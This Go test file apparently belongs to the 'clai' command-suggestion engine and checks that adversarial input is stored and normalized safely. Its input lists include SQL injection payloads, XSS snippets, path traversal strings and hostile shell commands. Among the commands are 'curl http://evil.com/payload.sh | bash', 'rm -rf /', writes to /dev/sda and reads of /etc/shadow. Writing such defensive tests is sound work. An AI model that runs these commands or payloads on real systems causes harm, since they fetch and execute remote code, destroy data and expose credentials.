// Package suggestions_test provides security tests that span multiple suggestion engine
// subsystems, verifying that dangerous inputs are handled safely across the ingestion,
// normalization, search, and suggestion boundaries.
package suggestions_test

import (
	"context"
	"database/sql"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/runger/clai/internal/suggestions/event"
	"github.com/runger/clai/internal/suggestions/ingest"
	"github.com/runger/clai/internal/suggestions/normalize"
	"github.com/runger/clai/internal/suggestions/search"

	_ "modernc.org/sqlite"
)

// createSecurityTestDB creates a full V2 schema database for security tests.
func createSecurityTestDB(t *testing.T) *sql.DB { //nolint:funlen // security test DB setup with full V2 schema
	t.Helper()

	dir, err := os.MkdirTemp("", "clai-security-test-*")
	require.NoError(t, err)
	t.Cleanup(func() { os.RemoveAll(dir) })

	dbPath := filepath.Join(dir, "security-test.db")
	db, err := sql.Open("sqlite", dbPath)
	require.NoError(t, err)
	t.Cleanup(func() { db.Close() })

	// Create V2 schema tables
	_, err = db.Exec(`
		CREATE TABLE session (
			id              TEXT PRIMARY KEY,
			shell           TEXT NOT NULL,
			started_at_ms   INTEGER NOT NULL,
			project_types   TEXT,
			host            TEXT,
			user_name       TEXT
		);

		CREATE TABLE command_event (
			id              INTEGER PRIMARY KEY AUTOINCREMENT,
			session_id      TEXT NOT NULL,
			ts_ms           INTEGER NOT NULL,
			cwd             TEXT NOT NULL,
			repo_key        TEXT,
			branch          TEXT,
			cmd_raw         TEXT NOT NULL,
			cmd_norm        TEXT NOT NULL,
			cmd_truncated   INTEGER NOT NULL DEFAULT 0,
			template_id     TEXT,
			exit_code       INTEGER,
			duration_ms     INTEGER,
			ephemeral       INTEGER NOT NULL DEFAULT 0
		);

		CREATE INDEX idx_event_ts ON command_event(ts_ms);
		CREATE INDEX idx_event_session_ts ON command_event(session_id, ts_ms);

		CREATE TABLE command_template (
			template_id     TEXT PRIMARY KEY,
			cmd_norm        TEXT NOT NULL,
			tags            TEXT,
			slot_count      INTEGER NOT NULL,
			first_seen_ms   INTEGER NOT NULL,
			last_seen_ms    INTEGER NOT NULL
		);

		CREATE TABLE transition_stat (
			scope             TEXT NOT NULL,
			prev_template_id  TEXT NOT NULL,
			next_template_id  TEXT NOT NULL,
			weight            REAL NOT NULL,
			count             INTEGER NOT NULL,
			last_seen_ms      INTEGER NOT NULL,
			PRIMARY KEY(scope, prev_template_id, next_template_id)
		);

		CREATE TABLE command_stat (
			scope           TEXT NOT NULL,
			template_id     TEXT NOT NULL,
			score           REAL NOT NULL,
			success_count   INTEGER NOT NULL,
			failure_count   INTEGER NOT NULL,
			last_seen_ms    INTEGER NOT NULL,
			PRIMARY KEY(scope, template_id)
		);

		CREATE TABLE slot_stat (
			scope           TEXT NOT NULL,
			template_id     TEXT NOT NULL,
			slot_index      INTEGER NOT NULL,
			value           TEXT NOT NULL,
			weight          REAL NOT NULL,
			count           INTEGER NOT NULL,
			last_seen_ms    INTEGER NOT NULL,
			PRIMARY KEY(scope, template_id, slot_index, value)
		);

		CREATE TABLE slot_correlation (
			scope             TEXT NOT NULL,
			template_id       TEXT NOT NULL,
			slot_key          TEXT NOT NULL,
			tuple_hash        TEXT NOT NULL,
			tuple_value_json  TEXT NOT NULL,
			weight            REAL NOT NULL,
			count             INTEGER NOT NULL,
			last_seen_ms      INTEGER NOT NULL,
			PRIMARY KEY(scope, template_id, slot_key, tuple_hash)
		);

		CREATE TABLE project_type_stat (
			project_type    TEXT NOT NULL,
			template_id     TEXT NOT NULL,
			score           REAL NOT NULL,
			count           INTEGER NOT NULL,
			last_seen_ms    INTEGER NOT NULL,
			PRIMARY KEY(project_type, template_id)
		);

		CREATE TABLE project_type_transition (
			project_type      TEXT NOT NULL,
			prev_template_id  TEXT NOT NULL,
			next_template_id  TEXT NOT NULL,
			weight            REAL NOT NULL,
			count             INTEGER NOT NULL,
			last_seen_ms      INTEGER NOT NULL,
			PRIMARY KEY(project_type, prev_template_id, next_template_id)
		);

		CREATE TABLE pipeline_event (
			id                INTEGER PRIMARY KEY AUTOINCREMENT,
			command_event_id  INTEGER NOT NULL,
			position          INTEGER NOT NULL,
			operator          TEXT,
			cmd_raw           TEXT NOT NULL,
			cmd_norm          TEXT NOT NULL,
			template_id       TEXT NOT NULL,
			UNIQUE(command_event_id, position)
		);

		CREATE TABLE pipeline_transition (
			scope             TEXT NOT NULL,
			prev_template_id  TEXT NOT NULL,
			next_template_id  TEXT NOT NULL,
			operator          TEXT NOT NULL,
			weight            REAL NOT NULL,
			count             INTEGER NOT NULL,
			last_seen_ms      INTEGER NOT NULL,
			PRIMARY KEY(scope, prev_template_id, next_template_id, operator)
		);

		CREATE TABLE pipeline_pattern (
			pattern_hash      TEXT PRIMARY KEY,
			template_chain    TEXT NOT NULL,
			operator_chain    TEXT NOT NULL,
			scope             TEXT NOT NULL,
			count             INTEGER NOT NULL,
			last_seen_ms      INTEGER NOT NULL,
			cmd_norm_display  TEXT NOT NULL
		);

		CREATE TABLE failure_recovery (
			scope                 TEXT NOT NULL,
			failed_template_id    TEXT NOT NULL,
			exit_code_class       TEXT NOT NULL,
			recovery_template_id  TEXT NOT NULL,
			weight                REAL NOT NULL,
			count                 INTEGER NOT NULL,
			success_rate          REAL NOT NULL,
			last_seen_ms          INTEGER NOT NULL,
			source                TEXT NOT NULL DEFAULT 'learned',
			PRIMARY KEY(scope, failed_template_id, exit_code_class, recovery_template_id)
		);

		CREATE TABLE schema_migrations (
			version     INTEGER PRIMARY KEY,
			applied_ms  INTEGER NOT NULL
		);
	`)
	require.NoError(t, err)

	// Insert a session
	_, err = db.Exec(`INSERT INTO session (id, shell, started_at_ms) VALUES (?, ?, ?)`,
		"sec-test-session", "bash", time.Now().UnixMilli())
	require.NoError(t, err)

	return db
}

// TestSecurity_SQLInjection_CommandText verifies that SQL injection attempts
// in command text do not corrupt the database.
func TestSecurity_SQLInjection_CommandText(t *testing.T) {
	t.Parallel()

	db := createSecurityTestDB(t)
	ctx := context.Background()

	// SQL injection payloads as command text
	injections := []string{
		"'; DROP TABLE command_event; --",
		`"; DROP TABLE command_event; --`,
		"' OR 1=1 --",
		`" OR 1=1 --`,
		"'; INSERT INTO command_event VALUES(999,'hack','2000','/','','','hack','hack',0,'',0,0,0); --",
		"Robert'); DROP TABLE command_template;--",
		"1; DELETE FROM command_stat WHERE 1=1",
		"' UNION SELECT * FROM session --",
		`'; UPDATE command_stat SET score=999999 WHERE '1'='1`,
		"cmd\x00'; DROP TABLE session; --", // NUL byte + injection
	}

	for _, injection := range injections {
		t.Run("injection", func(t *testing.T) {
			ev := &event.CommandEvent{
				Version:   1,
				Type:      "command_end",
				SessionID: "sec-test-session",
				Shell:     event.ShellBash,
				Cwd:       "/home/user",
				CmdRaw:    injection,
				ExitCode:  0,
				TS:        time.Now().UnixMilli(),
			}

			wctx := ingest.PrepareWriteContext(ev, "", "", "", 0, false, nil)

			// Should succeed without error (parameterized queries protect against injection)
			result, err := ingest.WritePath(ctx, db, wctx, &ingest.WritePathConfig{})
			require.NoError(t, err, "WritePath should handle injection safely: %q", injection)
			assert.Greater(t, result.EventID, int64(0))
		})
	}

	// Verify all critical tables still exist after injection attempts
	tables := []string{
		"command_event", "command_template", "command_stat",
		"transition_stat", "slot_stat", "session",
	}
	for _, table := range tables {
		var count int
		err := db.QueryRowContext(ctx, "SELECT COUNT(*) FROM "+table).Scan(&count)
		require.NoError(t, err, "table %s should still exist", table)
	}

	// Verify events were stored correctly (not as SQL commands)
	var storedCount int
	err := db.QueryRowContext(ctx, "SELECT COUNT(*) FROM command_event").Scan(&storedCount)
	require.NoError(t, err)
	assert.Equal(t, len(injections), storedCount, "all injection attempts should be stored as regular events")
}

// TestSecurity_SQLInjection_SearchQuery verifies that SQL injection in search
// queries does not compromise the database.
func TestSecurity_SQLInjection_SearchQuery(t *testing.T) {
	t.Parallel()

	dir, err := os.MkdirTemp("", "clai-security-search-*")
	require.NoError(t, err)
	t.Cleanup(func() { os.RemoveAll(dir) })

	dbPath := filepath.Join(dir, "security-search.db")
	db, err := sql.Open("sqlite", dbPath)
	require.NoError(t, err)
	t.Cleanup(func() { db.Close() })

	_, err = db.Exec(`
		CREATE TABLE command_event (
			id            INTEGER PRIMARY KEY AUTOINCREMENT,
			session_id    TEXT NOT NULL,
			ts            INTEGER NOT NULL,
			cmd_raw       TEXT NOT NULL,
			cmd_norm      TEXT NOT NULL,
			cwd           TEXT NOT NULL,
			repo_key      TEXT,
			ephemeral     INTEGER NOT NULL DEFAULT 0
		);
		CREATE INDEX idx_event_ts ON command_event(ts);
	`)
	require.NoError(t, err)

	svc, err := search.NewService(db, search.Config{EnableFallback: true})
	require.NoError(t, err)
	defer svc.Close()

	ctx := context.Background()

	// Insert a normal event
	result, err := db.Exec(`
		INSERT INTO command_event (session_id, ts, cmd_raw, cmd_norm, cwd, repo_key, ephemeral)
		VALUES ('session1', 1000000, 'git status', 'git status', '/home/user', '', 0)
	`)
	require.NoError(t, err)
	id, _ := result.LastInsertId()
	require.NoError(t, svc.IndexEvent(ctx, id))

	// SQL injection search queries
	injections := []string{
		"'; DROP TABLE command_event; --",
		`" OR 1=1 --`,
		"*; DELETE FROM command_event; --",
		"git\" UNION SELECT 1,2,3,4,5,6 --",
		"git' AND 1=0 UNION ALL SELECT * FROM session --",
	}

	for _, injection := range injections {
		t.Run("search_injection", func(_ *testing.T) {
			// Should not panic or corrupt DB
			results, searchErr := svc.Search(ctx, injection, search.SearchOptions{})
			// We accept either no error (query runs but returns no matches)
			// or an error (malformed query). Either way, the DB should be intact.
			_ = results
			_ = searchErr
		})
	}

	// Verify the table still exists and has our original event
	var count int
	err = db.QueryRow("SELECT COUNT(*) FROM command_event").Scan(&count)
	require.NoError(t, err)
	assert.Equal(t, 1, count, "command_event table should be intact with 1 row")
}

// TestSecurity_ShellMetacharacters verifies that shell metacharacters in
// suggestions are handled properly and don't cause issues when normalized.
func TestSecurity_ShellMetacharacters(t *testing.T) {
	t.Parallel()

	n := normalize.NewNormalizer()

	// Shell metacharacters that could be dangerous if not properly handled
	metacharCmds := []string{
		"echo $(whoami)",
		"echo `whoami`",
		"cat /etc/passwd > /tmp/stolen",
		"cmd && rm -rf /",
		"echo hello; rm -rf /",
		"echo ${PATH}",
		"$(curl http://evil.com/payload.sh | bash)",
		"`curl http://evil.com/payload.sh | bash`",
		"echo hello > /dev/sda",
		"echo hello >> /etc/passwd",
		"cmd < /dev/urandom",
		"echo $((1+1))",
		"echo ${HOME:-/root}",
		"echo {a,b,c}",
		"echo ~/../../etc/passwd",
		"echo $'\\x41\\x42\\x43'",
		"cmd 2>&1",
		"cmd &>/dev/null",
		"cmd |& tee log",
		"echo hello\\nworld",
	}

	for _, cmd := range metacharCmds {
		t.Run(cmd, func(t *testing.T) {
			// Normalization should not panic
			norm, slots := n.Normalize(cmd)

			// Output should be valid UTF-8
			assert.True(t, utf8.ValidString(norm),
				"normalized output should be valid UTF-8 for %q", cmd)

			// Slot values should be valid UTF-8
			for _, slot := range slots {
				assert.True(t, utf8.ValidString(slot.Value),
					"slot value should be valid UTF-8 for %q", cmd)
			}
		})
	}
}

// TestSecurity_XSSPayloads verifies that XSS-like payloads in command text
// are neutralized in output (no HTML/script injection).
func TestSecurity_XSSPayloads(t *testing.T) {
	t.Parallel()

	n := normalize.NewNormalizer()

	xssPayloads := []string{
		`<script>alert('xss')</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,
		`javascript:alert(1)`,
		`"><script>alert(document.cookie)</script>`,
		`<iframe src="http://evil.com">`,
		`<body onload=alert(1)>`,
		`<input onfocus=alert(1) autofocus>`,
		`${alert(1)}`,
		`{{constructor.constructor('alert(1)')()}}`,
		`<a href="javascript:alert(1)">click</a>`,
	}

	for _, payload := range xssPayloads {
		t.Run("xss", func(t *testing.T) {
			// Normalization should not panic
			norm, _ := n.Normalize(payload)

			// Output should be valid UTF-8
			assert.True(t, utf8.ValidString(norm))

			// Pre-normalization pipeline should also handle XSS safely
			result := normalize.PreNormalize(payload, normalize.PreNormConfig{})
			assert.True(t, utf8.ValidString(result.CmdNorm))

			// The output should not contain unescaped HTML that could be
			// rendered as active content. Since this is CLI-only output,
			// the primary concern is that the text is stored and returned
			// without interpretation, not that it's HTML-escaped.
			// We verify it doesn't cause panics or corruption.
		})
	}
}

// TestSecurity_MalformedUTF8 verifies that malformed UTF-8 input does not
// cause panics or data corruption through the ingestion pipeline.
func TestSecurity_MalformedUTF8(t *testing.T) {
	t.Parallel()

	db := createSecurityTestDB(t)
	ctx := context.Background()

	// Various malformed UTF-8 byte sequences
	malformedInputs := []string{
		"cmd \xff\xfe",                          // Invalid bytes
		"cmd \xc0\xaf",                          // Overlong encoding
		"cmd \xe0\x80\xaf",                      // Overlong 3-byte
		"cmd \xf0\x80\x80\xaf",                  // Overlong 4-byte
		"cmd \xed\xa0\x80",                      // Surrogate half
		"cmd \xf4\x90\x80\x80",                  // Beyond Unicode
		"cmd \x00hidden\x00null\x00bytes",       // NUL bytes
		string([]byte{0x80, 0x81, 0x82}),        // Continuation bytes without start
		"valid" + string([]byte{0xff}) + "text", // Invalid byte in middle
	}

	for _, input := range malformedInputs {
		t.Run("malformed_utf8", func(t *testing.T) {
			// Normalization should not panic
			n := normalize.NewNormalizer()
			norm, _ := n.Normalize(input)
			assert.True(t, utf8.ValidString(norm),
				"normalized output should be valid UTF-8")

			// Pre-normalization should not panic
			result := normalize.PreNormalize(input, normalize.PreNormConfig{})
			assert.True(t, utf8.ValidString(result.CmdNorm),
				"pre-normalized output should be valid UTF-8")

			// UTF-8 sanitization via ingest package
			sanitized := ingest.ToLossyUTF8([]byte(input))
			assert.True(t, utf8.ValidString(sanitized),
				"ToLossyUTF8 output should be valid UTF-8")

			// Write path should handle the sanitized input
			ev := &event.CommandEvent{
				Version:   1,
				Type:      "command_end",
				SessionID: "sec-test-session",
				Shell:     event.ShellBash,
				Cwd:       "/home/user",
				CmdRaw:    sanitized,
				ExitCode:  0,
				TS:        time.Now().UnixMilli(),
			}

			wctx := ingest.PrepareWriteContext(ev, "", "", "", 0, false, nil)
			writeResult, err := ingest.WritePath(ctx, db, wctx, &ingest.WritePathConfig{})
			require.NoError(t, err, "WritePath should handle sanitized malformed UTF-8")
			assert.Greater(t, writeResult.EventID, int64(0))

			// Verify the stored value is valid UTF-8
			var stored string
			err = db.QueryRowContext(ctx,
				"SELECT cmd_raw FROM command_event WHERE id = ?",
				writeResult.EventID,
			).Scan(&stored)
			require.NoError(t, err)
			assert.True(t, utf8.ValidString(stored),
				"stored cmd_raw should be valid UTF-8")
		})
	}
}

// TestSecurity_OversizedInput verifies that extremely large inputs are
// handled safely without excessive memory use or panics.
func TestSecurity_OversizedInput(t *testing.T) {
	t.Parallel()

	n := normalize.NewNormalizer()

	// Generate large inputs
	sizes := []int{1000, 10000, 100000}
	for _, size := range sizes {
		t.Run("normalize_large", func(t *testing.T) {
			largeCmd := "echo " + strings.Repeat("a", size)
			norm, _ := n.Normalize(largeCmd)
			assert.True(t, utf8.ValidString(norm))
		})
	}

	// Test event size enforcement
	for _, size := range sizes {
		t.Run("eventsize_large", func(t *testing.T) {
			largeCmd := strings.Repeat("x", size)
			enforced, truncated := normalize.EnforceEventSize(largeCmd, 0) // default limit
			assert.True(t, utf8.ValidString(enforced))
			if size > 16384 { // default max
				assert.True(t, truncated, "should be truncated at size %d", size)
				assert.LessOrEqual(t, len(enforced), 16384)
			}
		})
	}
}

// TestSecurity_NullByteInjection verifies that NUL bytes in various positions
// do not cause issues.
func TestSecurity_NullByteInjection(t *testing.T) {
	t.Parallel()

	n := normalize.NewNormalizer()

	nullInputs := []string{
		"\x00",
		"cmd\x00arg",
		"\x00cmd",
		"cmd\x00",
		"a\x00b\x00c\x00d",
		strings.Repeat("\x00", 100),
		"git\x00commit\x00-m\x00'test'",
	}

	for _, input := range nullInputs {
		t.Run("null_byte", func(t *testing.T) {
			// Normalization should not panic
			norm, _ := n.Normalize(input)
			assert.True(t, utf8.ValidString(norm))

			// Pre-normalization should not panic
			result := normalize.PreNormalize(input, normalize.PreNormConfig{})
			assert.True(t, utf8.ValidString(result.CmdNorm))
		})
	}
}

// TestSecurity_PathTraversal verifies that path traversal patterns in commands
// are normalized safely and don't cause file system access.
func TestSecurity_PathTraversal(t *testing.T) {
	t.Parallel()

	n := normalize.NewNormalizer()

	traversalCmds := []string{
		"cat ../../../etc/passwd",
		"cat /proc/self/environ",
		"cat /dev/mem",
		"ln -sf /etc/shadow /tmp/readable",
		"cat ~/../../etc/shadow",
		"cat ./../../../../etc/passwd",
		"cat ....//....//....//etc/passwd",
	}

	for _, cmd := range traversalCmds {
		t.Run("traversal", func(t *testing.T) {
			// Normalization should run without accessing the filesystem
			norm, _ := n.Normalize(cmd)
			assert.True(t, utf8.ValidString(norm))

			// Pre-normalization should also be safe
			result := normalize.PreNormalize(cmd, normalize.PreNormConfig{})
			assert.True(t, utf8.ValidString(result.CmdNorm))
		})
	}
}

// TestSecurity_SpecialSQLCharacters verifies that special SQLite characters
// in all text fields are handled safely through the write path.
func TestSecurity_SpecialSQLCharacters(t *testing.T) {
	t.Parallel()

	db := createSecurityTestDB(t)
	ctx := context.Background()

	specialChars := []string{
		"cmd with 'single quotes'",
		`cmd with "double quotes"`,
		"cmd with `backticks`",
		"cmd with -- comment",
		"cmd with /* block comment */",
		"cmd with ; semicolon",
		"cmd with %percent%",
		"cmd with _underscore_",
		"cmd with [brackets]",
		"cmd with (parens)",
		"cmd with {braces}",
	}

	for _, cmd := range specialChars {
		t.Run("special_sql_chars", func(t *testing.T) {
			ev := &event.CommandEvent{
				Version:   1,
				Type:      "command_end",
				SessionID: "sec-test-session",
				Shell:     event.ShellBash,
				Cwd:       "/home/user",
				CmdRaw:    cmd,
				ExitCode:  0,
				TS:        time.Now().UnixMilli(),
			}

			wctx := ingest.PrepareWriteContext(ev, "", "", "", 0, false, nil)
			result, err := ingest.WritePath(ctx, db, wctx, &ingest.WritePathConfig{})
			require.NoError(t, err, "WritePath should handle special SQL chars: %q", cmd)

			// Verify the original command is stored correctly (round-trip)
			var stored string
			err = db.QueryRowContext(ctx,
				"SELECT cmd_raw FROM command_event WHERE id = ?",
				result.EventID,
			).Scan(&stored)
			require.NoError(t, err)
			assert.Equal(t, cmd, stored,
				"stored command should match original for %q", cmd)
		})
	}
}

// TestSecurity_ConcurrentIngestion verifies that concurrent ingestion
// of adversarial inputs does not corrupt the database.
func TestSecurity_ConcurrentIngestion(t *testing.T) {
	t.Parallel()

	db := createSecurityTestDB(t)
	ctx := context.Background()

	adversarialCommands := []string{
		"'; DROP TABLE command_event; --",
		"normal command",
		"\xff\xfe invalid utf8",
		strings.Repeat("x", 50000), // oversized
		"git status",
		"<script>alert(1)</script>",
		"cmd\x00with\x00nulls",
		"echo $((1/0))",
		"$(rm -rf /)",
		"valid git commit -m 'test'",
	}

	// Run ingestion for all commands sequentially (SQLite is single-writer)
	for _, cmd := range adversarialCommands {
		sanitized := ingest.ToLossyUTF8([]byte(cmd))
		ev := &event.CommandEvent{
			Version:   1,
			Type:      "command_end",
			SessionID: "sec-test-session",
			Shell:     event.ShellBash,
			Cwd:       "/home/user",
			CmdRaw:    sanitized,
			ExitCode:  0,
			TS:        time.Now().UnixMilli(),
		}

		wctx := ingest.PrepareWriteContext(ev, "", "", "", 0, false, nil)
		_, err := ingest.WritePath(ctx, db, wctx, &ingest.WritePathConfig{})
		require.NoError(t, err, "WritePath should handle: %q", cmd)
	}

	// Verify database integrity after all ingestions
	var eventCount int
	err := db.QueryRowContext(ctx, "SELECT COUNT(*) FROM command_event").Scan(&eventCount)
	require.NoError(t, err)
	assert.Equal(t, len(adversarialCommands), eventCount,
		"all events should be stored")

	// Verify all critical tables are intact
	tables := []string{
		"command_event", "command_template", "command_stat",
		"transition_stat", "session",
	}
	for _, table := range tables {
		var count int
		err := db.QueryRowContext(ctx, "SELECT COUNT(*) FROM "+table).Scan(&count)
		require.NoError(t, err, "table %s should be readable", table)
	}
}
